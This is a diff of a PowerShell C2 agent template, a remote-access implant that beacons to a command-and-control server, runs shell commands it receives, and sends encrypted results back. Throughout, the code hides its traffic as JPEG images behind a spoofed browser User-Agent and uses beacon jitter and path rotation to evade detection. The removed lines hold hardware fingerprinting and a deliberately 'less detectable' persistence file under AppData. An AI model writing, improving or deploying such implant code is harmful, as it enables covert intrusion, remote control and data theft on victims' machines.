@@ -12,51 +12,9 @@ $commandResultPath = '{{CMD_RESULT_PATH}}'
 
 # Initialize encryption key as null - will be obtained from server
 $global:encryptionKey = $null
-
-# Initialize client ID storage
-$global:clientId = $null
+$global:firstContact = $true  # Flag to track if this is the first contact
 
 {{PATH_ROTATION_CODE}}
-
-# Function to generate a stable hardware-based ID
-function Get-StableClientId {
-    # Collect hardware identifiers that are relatively stable
-    $computerName = [System.Net.Dns]::GetHostName()
-    
-    # Get MAC address of primary network adapter
-    $macAddress = try {
-        (Get-WmiObject Win32_NetworkAdapterConfiguration | 
-         Where-Object { $_.IPEnabled -eq $true } | 
-         Select-Object -First 1).MACAddress
-    } catch {
-        "Unknown-MAC"
-    }
-    
-    # Get BIOS information if available
-    $biosSerial = try {
-        (Get-WmiObject Win32_BIOS).SerialNumber
-    } catch {
-        "Unknown-BIOS"
-    }
-    
-    # Combine hardware identifiers
-    $hardwareString = "$computerName|$macAddress|$biosSerial"
-    
-    # Generate hash for the hardware string
-    $hashBytes = [System.Security.Cryptography.SHA256]::Create().ComputeHash(
-        [System.Text.Encoding]::UTF8.GetBytes($hardwareString)
-    )
-    
-    # Take first 5 bytes of hash and convert to readable format
-    $randomPart = [BitConverter]::ToString($hashBytes[0..4]).Replace("-", "").ToUpper().Substring(0, 5)
-    
-    # Make the ID look like an image file to blend in with web traffic
-    $clientId = "$randomPart-img.jpeg"
-    
-    return $clientId
-}
-
-# Function to encrypt data for C2 communication
 
 # Function to encrypt data for C2 communication with binary JPEG header
 function Encrypt-Data {
@@ -166,6 +124,9 @@ function Update-EncryptionKey {
         # Set the global encryption key
         $global:encryptionKey = $newKey
         
+        # After receiving a key, we're no longer in first contact
+        $global:firstContact = $false
+        
         Write-Host "Encryption key updated successfully"
         return $true
     }
@@ -173,21 +134,6 @@ function Update-EncryptionKey {
         Write-Host "Error updating encryption key: $_"
         return $false
     }
-}
-
-# Function to generate a new client ID using the specified format
-function New-ClientId {
-    # Get hardware details
-    $computerName = [System.Net.Dns]::GetHostName()
-    $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | Select-Object -First 1).MACAddress
-
-    # Create a unique hash from the hardware info
-    $hashInput = "$computerName|$macAddress"
-    $hashBytes = [System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hashInput))
-    
-    # Create ID in the format XXXXX-img.jpeg
-    $randomPart = [BitConverter]::ToString($hashBytes[0..2]).Replace("-", "").ToUpper().Substring(0, 5)
-    return "$randomPart-img.jpeg"
 }
 
 # Function to gather system identification information
@@ -202,22 +148,6 @@ function Get-SystemIdentification {
         } catch {
             "Unknown"
         }
-    }
-    
-    # Generate a unique client identifier or use existing one
-    if ($global:clientId) {
-        # Use existing client ID if we have one
-        $systemInfo.ClientId = $global:clientId
-    } else {
-        # Generate a new client ID
-        $global:clientId = Get-StableClientId
-        $systemInfo.ClientId = $global:clientId
-        Write-Host "Generated new stable client ID: $global:clientId"
-    }
-    
-    # Add original client ID if we've done a rotation
-    if ($global:originalClientId -and $global:originalClientId -ne $global:clientId) {
-        $systemInfo.OriginalClientId = $global:originalClientId
     }
     
     # Add hardware identifiers to help server correlate clients
@@ -237,66 +167,10 @@ function Get-SystemIdentification {
     if ($global:pathRotationEnabled) {
         $systemInfo.RotationId = $global:currentRotationId
     }
-
-    # Debug info
-    Write-Host "DEBUG: System info client ID: $($systemInfo.ClientId)"
-    if ($systemInfo.OriginalClientId) {
-        Write-Host "DEBUG: System info original client ID: $($systemInfo.OriginalClientId)"
-    }
     
     # Convert to JSON
     $jsonInfo = ConvertTo-Json -InputObject $systemInfo -Compress
     return $jsonInfo
-}
-
-# Function to handle client ID rotation
-function Update-ClientId {
-    param([string]$NewClientId)
-    
-    try {
-        # Store the original client ID if we haven't already
-        if (-not $global:originalClientId) {
-            $global:originalClientId = $global:clientId
-        }
-        
-        # Update the global client ID variable
-        $global:clientId = $NewClientId
-        
-        # Try to save to disk, but don't fail if it's not possible
-        try {
-            # Create a storage location that's less detectable
-            $storageDir = [System.Environment]::ExpandEnvironmentVariables("%APPDATA%\Microsoft\Windows")
-            if (Test-Path $storageDir) {
-                $storageFile = Join-Path $storageDir "wmisvc.dat"
-                
-                # Create a structure to store both IDs
-                $idInfo = @{
-                    "CurrentId" = $NewClientId
-                    "OriginalId" = $global:originalClientId
-                }
-                
-                # Convert to JSON and encode
-                $jsonInfo = ConvertTo-Json -InputObject $idInfo -Compress
-                $bytes = [System.Text.Encoding]::UTF8.GetBytes($jsonInfo)
-                $encodedInfo = [Convert]::ToBase64String($bytes)
-                
-                # Save to file
-                [System.IO.File]::WriteAllText($storageFile, $encodedInfo)
-                Write-Host "Client ID info saved to persistent storage"
-            }
-        }
-        catch {
-            Write-Host "Note: Unable to save client ID to persistent storage: $_"
-            # Continue execution - in-memory change is still applied
-        }
-        
-        Write-Host "Client ID updated to: $NewClientId (original: $global:originalClientId)"
-        return $true
-    }
-    catch {
-        Write-Host "Error updating client ID: $_"
-        return $false
-    }
 }
 
 # Function to process commands from the C2 server
@@ -327,7 +201,6 @@ function Process-Commands {
                 $resultObj = @{
                     timestamp = $timestamp
                     result = $result
-                    client_id = $global:clientId
                     system_info = Get-SystemIdentification
                 }
                 
@@ -361,7 +234,6 @@ function Process-Commands {
                             $encryptedResult = Encrypt-Data -PlainText $resultJson
                             $encryptedObj = @{
                                 data = $encryptedResult
-                                client_id = $global:clientId
                             }
                             $encryptedJson = ConvertTo-Json -InputObject $encryptedObj -Compress
                             $resultClient.UploadString($resultUrl, $encryptedJson)
@@ -384,17 +256,6 @@ function Process-Commands {
                 # Handle key rotation command from operator
                 $success = Update-EncryptionKey -Base64Key $args
                 $result = if ($success) { "Key rotation successful - using new encryption key" } else { "Key rotation failed" }
-            }
-            elseif ($commandType -eq "client_id_rotation") {
-                # Handle client ID rotation command
-                $newClientId = $args
-                $success = Update-ClientId -NewClientId $newClientId
-                $result = if ($success) { 
-                    "Client ID rotation successful - now using $newClientId (original: $global:originalClientId)" 
-                } else { 
-                    "Client ID rotation failed" 
-                }
-                Write-Host $result
             }
             elseif ($commandType -eq "execute") {
                 # Execute shell command
@@ -432,7 +293,6 @@ function Process-Commands {
             $resultObj = @{
                 timestamp = $timestamp
                 result = $result
-                client_id = $global:clientId
             }
             
             $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
@@ -451,7 +311,6 @@ function Process-Commands {
             # Create payload with encrypted data (JPEG header is now added inside Encrypt-Data)
             $payload = @{
                 data = $encryptedResult
-                client_id = $global:clientId
             }
             $payloadJson = ConvertTo-Json -InputObject $payload -Compress
             
@@ -469,7 +328,6 @@ function Process-Commands {
             $resultObj = @{
                 timestamp = $timestamp
                 result = "Error executing command: $_"
-                client_id = $global:clientId
             }
             
             $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
@@ -485,10 +343,9 @@ function Process-Commands {
             $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
             $resultClient.Headers.Add("Content-Type", "application/json")
             
-            # Create payload with encrypted data (JPEG header is now added inside Encrypt-Data)
+            # Create payload with encrypted data
             $payload = @{
                 data = $encryptedResult
-                client_id = $global:clientId
             }
             $payloadJson = ConvertTo-Json -InputObject $payload -Compress
             
@@ -554,125 +411,10 @@ function Process-ServerResponse {
     }
 }
 
-# Create a persistent storage for client ID - modified to be more resilient
-function Save-ClientId {
-    param(
-        [string]$ClientId,
-        [string]$OriginalClientId
-    )
-    
-    if (-not $ClientId) {
-        return
-    }
-    
-    try {
-        # Create a storage location that's less detectable
-        $storageDir = [System.Environment]::ExpandEnvironmentVariables("%APPDATA%\Microsoft\Windows")
-        if (-not (Test-Path $storageDir)) {
-            New-Item -Path $storageDir -ItemType Directory -Force | Out-Null
-        }
-        
-        # Store the client ID in an innocuous-looking file
-        $storageFile = Join-Path $storageDir "wmisvc.dat"
-        
-        # Create a structure to store both IDs
-        $idInfo = @{
-            "CurrentId" = $ClientId
-            "OriginalId" = $OriginalClientId
-        }
-        
-        # Convert to JSON and encode
-        $jsonInfo = ConvertTo-Json -InputObject $idInfo -Compress
-        $bytes = [System.Text.Encoding]::UTF8.GetBytes($jsonInfo)
-        $encodedInfo = [Convert]::ToBase64String($bytes)
-        
-        # Save to file
-        [System.IO.File]::WriteAllText($storageFile, $encodedInfo)
-        
-        Write-Host "Client ID info saved to persistent storage"
-    }
-    catch {
-        Write-Host "Warning: Unable to save client ID to persistent storage: $_"
-        # This is non-critical as we can regenerate the ID based on hardware
-    }
-}
-
-
-# Loads the client ID from persistent storage
-function Load-ClientId {
-    try {
-        $storageFile = [System.Environment]::ExpandEnvironmentVariables("%APPDATA%\Microsoft\Windows\wmisvc.dat")
-        if (Test-Path $storageFile) {
-            $encodedInfo = [System.IO.File]::ReadAllText($storageFile)
-            $bytes = [Convert]::FromBase64String($encodedInfo)
-            $jsonInfo = [System.Text.Encoding]::UTF8.GetString($bytes)
-            
-            try {
-                # Try to parse as JSON (new format)
-                $idInfo = ConvertFrom-Json -InputObject $jsonInfo
-                
-                # Set global variables for both current and original IDs
-                $global:clientId = $idInfo.CurrentId
-                $global:originalClientId = $idInfo.OriginalId
-                
-                Write-Host "Loaded client ID from persistent storage: $global:clientId"
-                if ($global:originalClientId) {
-                    Write-Host "Loaded original client ID: $global:originalClientId"
-                }
-                
-                return $global:clientId
-            }
-            catch {
-                # Try old format (just a plain string)
-                $clientId = [System.Text.Encoding]::UTF8.GetString($bytes)
-                $global:clientId = $clientId
-                $global:originalClientId = $clientId  # Same as current in old format
-                Write-Host "Loaded client ID (old format) from persistent storage: $clientId"
-                return $clientId
-            }
-        }
-    }
-    catch {
-        Write-Host "Warning: Unable to load client ID from persistent storage: $_"
-    }
-    
-    # If we can't load from storage, generate a new stable ID
-    $stableId = Get-StableClientId
-    $global:clientId = $stableId
-    $global:originalClientId = $stableId  # Initialize original to be the same as current
-    return $stableId
-}
-
 # Main agent loop
 function Start-AgentLoop {
     $beaconInterval = {{BEACON_INTERVAL}}  # Seconds
     $jitterPercentage = {{JITTER_PERCENTAGE}}  # +/- percentage to randomize beacon timing
-    
-    # Try to load previously stored client ID
-    $loadedClientId = Load-ClientId
-    if ($loadedClientId) {
-        $global:clientId = $loadedClientId
-        Write-Host "Loaded client ID from persistent storage: $global:clientId"
-    } else {
-        # Generate a stable hardware-based client ID
-        $global:clientId = Get-StableClientId
-        Write-Host "Generated stable client ID: $global:clientId"
-        
-        # Try to save it, but if saving fails, it's not critical since we can regenerate it
-        try {
-            Save-ClientId -ClientId $global:clientId
-        } catch {
-            Write-Host "Note: Unable to save client ID, but will continue using in-memory ID"
-        }
-    }
-    
-    # Get system information for identification
-    $systemInfo = Get-SystemIdentification
-    
-    # Extract client ID and hostname from system info
-    $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
-    $clientId = $systemInfoObj.ClientId
-    $hostname = $systemInfoObj.Hostname
     
     # Track failed connection attempts for fallback
     $consecutiveFailures = 0
@@ -710,28 +452,30 @@ function Start-AgentLoop {
             # Prepare the system info data
             $systemInfoRaw = Get-SystemIdentification
             
-            # For first contact, don't encrypt; for established contacts, encrypt with JPEG header
-            if ($null -ne $global:encryptionKey) {
-                # The Encrypt-Data function now adds the JPEG header at binary level
-                $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfoRaw
-                $systemInfoToSend = $encryptedSystemInfo
+            # Create beacon payload with different format based on encryption status
+            if ($global:firstContact) {
+                # First contact - simpler payload
+                $beaconPayload = @{
+                    data = $systemInfoRaw
+                    first_contact = $true
+                }
             } else {
-                # For first contact, don't encrypt or add header
-                $systemInfoToSend = $systemInfoRaw
+                # Established contact - encrypt data and don't include client ID
+                $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfoRaw
+                $beaconPayload = @{
+                    data = $encryptedSystemInfo
+                }
+                
+                # Include rotation ID only if path rotation is enabled
+                if ($global:pathRotationEnabled) {
+                    $beaconPayload.rotation_id = $global:currentRotationId
+                }
             }
             
-            # Add this before the beacon payload creation
-            Write-Host "DEBUG: Using client ID: $global:clientId"
-            # Prepare the beacon payload - include client ID in plain text
-            $beaconPayload = @{
-                client_id = $global:clientId
-                data = $systemInfoToSend
-                rotation_id = if ($global:pathRotationEnabled) { $global:currentRotationId } else { 0 }
-            }
             $beaconJson = ConvertTo-Json -InputObject $beaconPayload -Compress
             
             # Beacon to the C2 server
-            Write-Host "[$hostname] Beaconing to $beaconUrl"
+            Write-Host "Beaconing to $beaconUrl"
             $response = $webClient.UploadString($beaconUrl, "POST", $beaconJson)
             
             # Process response data
@@ -742,14 +486,8 @@ function Start-AgentLoop {
             $consecutiveFailures = 0
             $usingFallbackPaths = $false
             
-            # Save client ID to persistent storage if it's new or changed
-            if ($global:clientId -and ($global:clientId -ne $loadedClientId)) {
-                Save-ClientId -ClientId $global:clientId
-                $loadedClientId = $global:clientId
-            }
-            
             # Process response if it contains commands
-            if ($responseObject.commands -and $responseObject.commands.Length -gt 0) {
+            if ($responseObject.commands -and ($responseObject.commands.Length -gt 0 -or $responseObject.encrypted -eq $true)) {
                 # Check for special flag that indicates first contact/key issuance
                 $isFirstContact = $responseObject.first_contact -eq $true
                 
@@ -779,14 +517,14 @@ function Start-AgentLoop {
         }
         catch {
             $errorMsg = $_.Exception.Message
-            Write-Host "[$hostname] Error in beacon: $errorMsg"
+            Write-Host "Error in beacon: $errorMsg"
             
             # Increment failure counter
             $consecutiveFailures++
             
             # If too many failures and using dynamic paths, try falling back to default paths
             if ($global:pathRotationEnabled -and $consecutiveFailures -ge $maxFailuresBeforeFallback -and -not $usingFallbackPaths) {
-                Write-Host "[$hostname] Falling back to initial paths after $consecutiveFailures failures"
+                Write-Host "Falling back to initial paths after $consecutiveFailures failures"
                 $usingFallbackPaths = $true
             }
             
@@ -794,7 +532,7 @@ function Start-AgentLoop {
             if ($consecutiveFailures -gt ($maxFailuresBeforeFallback * 2)) {
                 # Exponential backoff with max of 5 minutes
                 $backoffSeconds = [Math]::Min({{MAX_BACKOFF}}, [Math]::Pow(2, ($consecutiveFailures - $maxFailuresBeforeFallback * 2) + 2))
-                Write-Host "[$hostname] Connection issues persist, waiting $backoffSeconds seconds before retry"
+                Write-Host "Connection issues persist, waiting $backoffSeconds seconds before retry"
                 Start-Sleep -Seconds $backoffSeconds
                 continue
             }
